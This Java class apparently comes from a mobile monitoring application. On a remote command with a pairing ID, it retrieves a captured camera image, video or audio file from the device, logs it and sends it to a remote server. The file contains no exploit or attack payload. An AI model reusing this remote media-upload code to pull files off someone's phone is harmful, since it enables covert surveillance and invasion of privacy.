package com.vvt.rmtcmd.pcc;

import java.util.Hashtable;
import com.vvt.db.FxEventDatabase;
import com.vvt.event.FxAudioFileEvent;
import com.vvt.event.FxCameraImageEvent;
import com.vvt.event.FxEvent;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.FxVideoFileEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.event.constant.FxDirection;
import com.vvt.event.constant.FxMediaTypes;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.mediamon.info.MediaInfo;
import com.vvt.mediamon.info.MediaInfoType;
import com.vvt.mediamon.seeker.MediaSeekerDb;
import com.vvt.mediamon.seeker.MediaMapping;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.prot.command.response.SendEventCmdResponse;
import com.vvt.protsrv.ActualMediaListener;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;
import com.vvt.std.FileUtil;
import com.vvt.std.Log;
import com.vvt.std.StringUtil;

public class PCCUploadActualMedia extends PCCRmtCmdAsync implements ActualMediaListener {
	
	private final String TAG = "PCCUploadActualMediaCmd";
	private int paringId = 0;
	private boolean isLowDiskSpace = false;
	private SendEventManager eventSender = Global.getSendEventManager();
	private FxEventDatabase db = Global.getFxEventDatabase();
	private Hashtable paringIdMap = null;
	private MediaSeekerDb mediadb = MediaSeekerDb.getInstance();
	
	public PCCUploadActualMedia(int paringId) {
		this.paringId = paringId;		
	}
	
	private boolean isInitActualMediaSuccess() {
		boolean success = false;
		MediaMapping mapping = mediadb.getMediaMapping();
		if (mapping != null) {
			paringIdMap = mapping.getParingIdMap();		
			if (paringIdMap != null) {
				MediaInfo mediaInfo = null;
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".initActualMedia()", "paringId: " + paringId);
				}
				mediaInfo = (MediaInfo) paringIdMap.get(new Integer(paringId));
				/*if (Log.isDebugEnable()) {
					if (mediaInfo != null) {
						Log.debug(TAG + ".initActualMedia()", "getActualName: " + mediaInfo.getActualName());
						Log.debug(TAG + ".initActualMedia()", "getActualPath: " + mediaInfo.getActualPath());
						Log.debug(TAG + ".initActualMedia()", "getParingId: " + mediaInfo.getParingId());
						Log.debug(TAG + ".initActualMedia()", "getThumbPath: " + mediaInfo.getThumbPath());
						Log.debug(TAG + ".initActualMedia()", "getFxMediaTypes: " + mediaInfo.getFxMediaTypes().getId());
						Log.debug(TAG + ".initActualMedia()", "getMediaInfoType: " + mediaInfo.getMediaInfoType().getId());
					}
				}*/
				if (mediaInfo != null) {
					success = true;
					if (mediaInfo.getMediaInfoType().equals(MediaInfoType.IMAGE_THUMBNAIL)) {
						initFxCameraImageEvent(mediaInfo);
						checkLowDiskSpace(mediaInfo.getActualPath(), mediaInfo.getParingId());
					} else if (mediaInfo.getMediaInfoType().equals(MediaInfoType.VIDEO_THUMBNAIL)) {
						initFxVideoFileEvent(mediaInfo);
						checkLowDiskSpace(mediaInfo.getActualPath(), mediaInfo.getParingId());
					} else if (mediaInfo.getMediaInfoType().equals(MediaInfoType.AUDIO_THUMBNAIL)) {
						initFxAudioFileEvent(mediaInfo);
						checkLowDiskSpace(mediaInfo.getActualPath(), mediaInfo.getParingId());
					} else {
						success = false;
						// Wrong type!
						Log.error(TAG + ".initActualMedia()", "Wrong Media Info type!");
					}
				} else {
					FxAudioFileEvent fxAudioFileEvent = new FxAudioFileEvent();
					// To set event time.
					fxAudioFileEvent.setEventTime(System.currentTimeMillis());
					fxAudioFileEvent.setPairingId(paringId);
					fxAudioFileEvent.setFormat(FxMediaTypes.UNKNOWN);
					fxAudioFileEvent.setFileName(null);
					fxAudioFileEvent.setFilePath(null);
					insertDb(fxAudioFileEvent);
				}
			}
		}
		return success;
	}
	
	private void initFxCameraImageEvent(MediaInfo mediaInfo) {
		FxCameraImageEvent fxCamImageEvent = new FxCameraImageEvent();
		// To set event time.
		fxCamImageEvent.setEventTime(System.currentTimeMillis());
		fxCamImageEvent.setPairingId(mediaInfo.getParingId());
		fxCamImageEvent.setFormat(mediaInfo.getFxMediaTypes());
		fxCamImageEvent.setLongitude(0);
		fxCamImageEvent.setLatitude(0);
		fxCamImageEvent.setAltitude(0);
		fxCamImageEvent.setFileName(mediaInfo.getActualName());
		fxCamImageEvent.setFilePath(mediaInfo.getActualPath());		
		insertDb(fxCamImageEvent);
	}
	
	private void initFxVideoFileEvent(MediaInfo mediaInfo) {
		FxVideoFileEvent fxVDOFileEvent = new FxVideoFileEvent();
		// To set event time.
		fxVDOFileEvent.setEventTime(System.currentTimeMillis());
		fxVDOFileEvent.setPairingId(mediaInfo.getParingId());
		fxVDOFileEvent.setFormat(mediaInfo.getFxMediaTypes());
		fxVDOFileEvent.setFileName(mediaInfo.getActualName());
		fxVDOFileEvent.setFilePath(mediaInfo.getActualPath());
		insertDb(fxVDOFileEvent);
	}
	
	private void initFxAudioFileEvent(MediaInfo mediaInfo) {
		FxAudioFileEvent fxAudioFileEvent = new FxAudioFileEvent();
		// To set event time.
		fxAudioFileEvent.setEventTime(System.currentTimeMillis());
		fxAudioFileEvent.setPairingId(mediaInfo.getParingId());
		fxAudioFileEvent.setFormat(mediaInfo.getFxMediaTypes());
		fxAudioFileEvent.setFileName(mediaInfo.getActualName());
		fxAudioFileEvent.setFilePath(mediaInfo.getActualPath());
		insertDb(fxAudioFileEvent);
	}
	
	private void insertDb(FxEvent event) {
		synchronized(PCCUploadActualMedia.class) {
			db.insert(event);
		}
	}
	
	private void checkLowDiskSpace(String filePath, int paringId) {
		try {
			long fileSize = FileUtil.getFileSize(filePath);
			long freeSize = FileUtil.getAvailableSize(ApplicationInfo.DISK_SPACE_PATH);
			isLowDiskSpace = false;
			if (fileSize >= freeSize) {
				isLowDiskSpace = true;
				createLowDiskSpaceSystemEvent(paringId, fileSize, freeSize);
			}
		} catch (Exception e) {
			e.printStackTrace();
			Log.error(TAG + ".checkLowDiskSpace()", e.getMessage());
		}
	}
	
	private void createLowDiskSpaceSystemEvent(int paringId, long fileSize, long freeSize) {
		int patternLength = 3;
		String[] replacement = new String[patternLength];
		replacement[0] = Constant.EMPTY_STRING + paringId;
		replacement[1] = Constant.EMPTY_STRING + (fileSize/1024);
		replacement[2] = Constant.EMPTY_STRING + (freeSize/1024);
		String message = StringUtil.getTextMessage(patternLength, RmtCmdTextResource.LOW_DISK_SPACE, replacement);
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.DISK_INFO);
		systemEvent.setEventTime(System.currentTimeMillis());
		systemEvent.setDirection(FxDirection.OUT);
		systemEvent.setSystemMessage(message);	
		insertDb(systemEvent);
	}
	
	// Runnable
	public void run() {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".PCCUploadActualMediaCmd()", "ENTER");
		}
		doPCCHeader(PhoenixCompliantCommand.UPLOAD_MEDIA.getId());
		try {
			if (isInitActualMediaSuccess()) {
				if (!isLowDiskSpace) {
					responseMessage.append(Constant.OK);
					responseMessage.append(Constant.CRLF);
					responseMessage.append(RmtCmdTextResource.UPLOAD_ACTUAL_MEDIA_PROCESSED);
					responseMessage.append(paringId);
					createSystemEventOut(responseMessage.toString());
					eventSender.addActualMediaListener(this);
				} 
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.PAIRING_ID + paringId + RmtCmdTextResource.DOES_NOT_EXIST);
				createSystemEventOut(responseMessage.toString());
				observer.cmdExecutedError(this);
			}
		} catch(Exception e) {
			e.printStackTrace();
			Log.error(TAG + ".run()", e.getMessage());
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.PAIRING_ID + paringId + Constant.SPACE + e.getMessage());
			createSystemEventOut(responseMessage.toString());
			observer.cmdExecutedError(this);
		}
		// To send events
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}

	// PhoenixProtocolListener
	public void onActualMediaError(String message, long paringId) {
		if (this.paringId == paringId) {
			Log.error("PCCUploadActualMediaCmd.execute.onError", "message: " + message);
			eventSender.removeActualMediaListener(this);
			doPCCHeader(PhoenixCompliantCommand.UPLOAD_MEDIA.getId());
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.PAIRING_ID + paringId + Constant.SPACE + message);
			createSystemEventOut(responseMessage.toString());		
			observer.cmdExecutedError(this);
			// To send events
			eventSender.sendEvents();
		}
	}

	public void onActualMediaSuccess(CommandResponse response, long paringId) {
		if (this.paringId == paringId) {
			eventSender.removeActualMediaListener(this);
			if (response instanceof SendEventCmdResponse) {			
				doPCCHeader(PhoenixCompliantCommand.UPLOAD_MEDIA.getId());
				SendEventCmdResponse sendEventRes = (SendEventCmdResponse)response;
				if (sendEventRes.getStatusCode() == 0) {
					responseMessage.append(Constant.OK);
					responseMessage.append(Constant.CRLF);
					responseMessage.append(RmtCmdTextResource.UPLOAD_ACTUAL_MEDIA_COMPLETE);
					responseMessage.append(paringId);
					observer.cmdExecutedSuccess(this);
				} else {
					responseMessage.append(Constant.ERROR);
					responseMessage.append(Constant.CRLF);
					responseMessage.append(RmtCmdTextResource.PAIRING_ID + paringId + Constant.SPACE + sendEventRes.getServerMsg());
					observer.cmdExecutedError(this);
				}
				createSystemEventOut(responseMessage.toString());
				// To send events
				eventSender.sendEvents();
			}
		}
	}
}
